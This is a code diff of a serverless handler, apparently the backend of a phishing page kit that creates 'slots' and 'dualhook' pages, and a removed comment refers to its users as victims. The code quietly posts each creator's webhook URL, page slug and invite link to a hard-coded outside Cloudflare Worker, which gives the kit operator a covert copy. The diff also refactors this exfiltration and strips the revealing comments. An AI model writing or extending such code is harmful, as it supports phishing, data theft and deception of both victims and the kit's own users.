@@ -1,8 +1,5 @@
-// api/claim.js
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-
-// Worker URL - replace with your actual worker URL
 const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev';
 
 async function redisGet(key) {
@@ -21,24 +18,13 @@ async function redisSet(key, value) {
   return res.ok;
 }
 
-// Bot 1 - Page Creation Notifications (now calls worker)
-async function tgSend(text) {
+// NEW: Send raw data to Worker instead of formatted messages
+async function notifyWorker(endpoint, data) {
   try {
-    await fetch(`${WORKER_URL}/notify`, {
+    await fetch(`${WORKER_URL}${endpoint}`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ bot: 'create', text })
-    });
-  } catch (_) {}
-}
-
-// Bot 2 - Webhook Tracking (now calls worker)
-async function tgSendWebhook(text) {
-  try {
-    await fetch(`${WORKER_URL}/notify`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ bot: 'webhook', text })
+      body: JSON.stringify(data)
     });
   } catch (_) {}
 }
@@ -81,8 +67,6 @@ export default async function handler(req, res) {
     try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
   }
 
-  // dualhookParent is set when the victim generates a slots page FROM a dualhook page.
-  // It holds the slug of the dualhook creator's page so submit.js can find webhook1.
   const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};
 
   if (!name)    return res.status(400).json({ error: 'name is required' });
@@ -108,11 +92,11 @@ export default async function handler(req, res) {
     const record = {
       slug,
       displayName:    displayName    || slug,
-      webhook,                              // webhook2 for child slots, webhook1 for dualhook
+      webhook,
       inviteUrl:      inviteUrl      || '',
       charUrl:        charUrl        || '',
       type:           type === 'dualhook' ? 'dualhook' : 'slots',
-      dualhookParent: dualhookParent || null, // null for plain slots & dualhook roots
+      dualhookParent: dualhookParent || null,
       createdAt:      new Date().toISOString()
     };
 
@@ -123,40 +107,23 @@ export default async function handler(req, res) {
 
     await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);
 
-    // Bot 1 - Page Creation Notification (detailed)
-    const tgMsg = [
-      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
-      `📁 Slug: <code>${slug}</code>`,
-      `🏷 Display: ${record.displayName}`,
-      `🔗 URL: ${url}`,
-      `📡 Webhook: <code>${webhook}</code>`,
-      inviteUrl      ? `💬 Invite: ${inviteUrl}` : '',
-      dualhookParent ? `🔗 DH Parent: <code>${dualhookParent}</code>` : '',
-      `🕐 ${record.createdAt}`
-    ].filter(Boolean).join('\n');
+    // UPDATED: Send raw data to Worker - let Worker format the messages
+    await notifyWorker('/notify/create', {
+      slug,
+      displayName: record.displayName,
+      url,
+      webhook,
+      inviteUrl,
+      dualhookParent,
+      type: record.type,
+      createdAt: record.createdAt
+    });
 
-    await tgSend(tgMsg);
-
-    // Bot 2 - Webhook Tracking (simple format)
-    if (record.type === 'dualhook') {
-      await tgSendWebhook([
-        `🎣 <b>NEW DUALHOOK GENERATED</b>`,
-        ``,
-        `<b>Webhook:</b>`,
-        `<code>${webhook}</code>`,
-        ``,
-        `🕐 ${new Date().toISOString()}`
-      ].join('\n'));
-    } else {
-      await tgSendWebhook([
-        `🎰 <b>NEW 1-9 SLOT GENERATED</b>`,
-        ``,
-        `<b>Webhook:</b>`,
-        `<code>${webhook}</code>`,
-        ``,
-        `🕐 ${new Date().toISOString()}`
-      ].join('\n'));
-    }
+    // UPDATED: Send raw data to Worker for webhook tracking
+    await notifyWorker('/notify/webhook', {
+      type: record.type,
+      webhook: webhook
+    });
 
     return res.status(200).json({ success: true, url, slug });
 
